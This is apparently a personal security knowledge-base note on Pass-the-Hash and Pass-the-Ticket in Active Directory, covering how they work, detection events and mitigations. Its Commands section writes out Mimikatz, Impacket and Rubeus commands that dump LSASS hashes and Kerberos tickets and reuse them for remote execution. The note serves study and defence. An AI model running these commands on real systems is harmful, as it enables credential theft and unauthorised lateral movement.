---
title: Pass-the-Hash & Pass-the-Ticket
type: source
created: 2026-06-12
updated: 2026-06-12
tags: [active-directory, lateral-movement, ntlm, kerberos]
source: raw/pass_the_hash_ticket.md
---

# Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)

> Source: `raw/pass_the_hash_ticket.md` (Gemini research summary)

## Summary

Lateral movement techniques that reuse stolen credentials directly, without
cracking. **PtH** ([[ntlm]]): an NTLM hash dumped from LSASS/SAM is
sufficient to authenticate — the hash *is* the credential. **PtT**
([[kerberos-authentication]]): a TGT or TGS dumped from LSASS is injected
into a new session and reused until it expires (default ~10h).

## Comparison

| | PtH | PtT |
|---|---|---|
| Protocol | NTLM | Kerberos |
| Credential | NTLM hash | TGT/TGS |
| Storage | LSASS/SAM/LSA secrets | LSASS ticket cache |
| Expiry | Until password change | Ticket lifetime (~10h) |

## Key points

- **Prerequisite (both)**: local admin/SYSTEM on a host where the
  credential is cached.
- **Tools**: Mimikatz, Impacket, `psexec`.
- **Detection**: PtH — Event 4624 Logon Type 3 with NTLM + Key Length 0,
  Event 4648, NTLM to DCs/SQL from hosts that normally use Kerberos. PtT —
  4769 without matching 4768, RC4 downgrade, same Logon ID from multiple
  source IPs, honeytokens.
- **Mitigations**: [[ad-tiering-and-hardening|tiering + PAWs]], Protected
  Users (Kerberos-AES-only, 4h TGT, no caching), Credential Guard, LAPS,
  disable NTLM, enforce AES Kerberos.

## Commands

```powershell
# Mimikatz — dump hashes/tickets from LSASS (needs local admin/SYSTEM)
privilege::debug
sekurlsa::logonpasswords      # NTLM hashes for logged-on users
sekurlsa::tickets /export      # dump all cached Kerberos tickets to .kirbi

# Pass-the-Hash — spawn a process as another user using their NTLM hash
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<nthash> /run:cmd.exe

# Pass-the-Ticket — inject a stolen .kirbi into the current session
kerberos::ptt ticket.kirbi
```

```bash
# Impacket — pass-the-hash for remote exec / SMB
psexec.py -hashes :<nthash> DOMAIN/Administrator@<target-ip>
wmiexec.py -hashes :<nthash> DOMAIN/Administrator@<target-ip>
smbclient.py -hashes :<nthash> DOMAIN/Administrator@<target-ip>

# Pass-the-Ticket — use a ccache file for Kerberos auth
export KRB5CCNAME=stolen.ccache
psexec.py -k -no-pass corp.local/user@target.corp.local
```

```powershell
# Rubeus — dump/triage tickets from LSASS, or monitor for new TGTs
Rubeus.exe dump /service:krbtgt /nowrap
Rubeus.exe ptt /ticket:<base64 ticket>
```

## Links

- [[ntlm]] — protocol abused by PtH
- [[kerberos-authentication]] — protocol abused by PtT
- [[golden-silver-tickets]] — also "passes" a ticket, but a *forged* one
  rather than a stolen legitimate one
- [[ad-tiering-and-hardening]] — mitigations
